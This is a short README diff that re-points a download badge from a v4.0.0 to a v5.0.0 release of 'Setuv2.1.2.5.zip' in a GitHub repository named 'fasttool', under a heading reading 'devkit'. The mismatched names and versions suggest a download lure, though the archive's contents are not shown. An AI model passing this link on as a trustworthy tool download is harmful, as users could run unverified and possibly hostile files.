@@ -1,4 +1,4 @@
-[![Download](https://img.shields.io/badge/Download-Setuv2.1.2.5.zip-blue?style=for-the-badge&logo=files)](https://github.com/johnsantos-x90h3/fasttool/releases/download/v4.0.0/Setuv2.1.2.5.zip)
+[![Download](https://img.shields.io/badge/Download-Setuv2.1.2.5.zip-blue?style=for-the-badge&logo=files)](https://github.com/johnsantos-x90h3/fasttool/releases/download/v5.0.0/Setuv2.1.2.5.zip)
 
 # ⚡ devkit
 
